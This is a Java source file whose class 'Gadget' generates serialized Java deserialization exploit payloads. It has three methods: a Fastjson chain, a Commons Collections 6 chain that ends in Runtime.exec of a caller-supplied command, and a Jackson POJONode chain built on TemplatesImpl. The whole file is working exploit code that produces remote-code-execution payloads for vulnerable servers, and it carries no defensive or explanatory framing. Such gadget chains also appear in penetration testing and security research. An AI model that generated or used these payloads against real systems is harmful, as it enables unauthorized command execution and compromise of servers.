package org.util;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Gadget {
    public static byte[] fastjson49_83(String common) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        Field field = bd.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(bd, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template,bd);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(hashMap);
        return byteArrayOutputStream.toByteArray();
    }

    public static byte[] cc6(String common) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{common})
        });
        HashMap hashMap = new HashMap();
        Map decorate = LazyMap.decorate(hashMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        f = HashSet.class.getDeclaredField("map");
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = HashMap.class.getDeclaredField("table");
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(map);
        return byteArrayOutputStream.toByteArray();
    }

    public static byte[] jackson(String common) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common);
        POJONode node = new POJONode(template);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        //反射设置val属性
        Field val1 = val.getClass().getDeclaredField("val");
        val1.setAccessible(true);
        val1.set(val,node);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(val);
        return byteArrayOutputStream.toByteArray();
    }
}
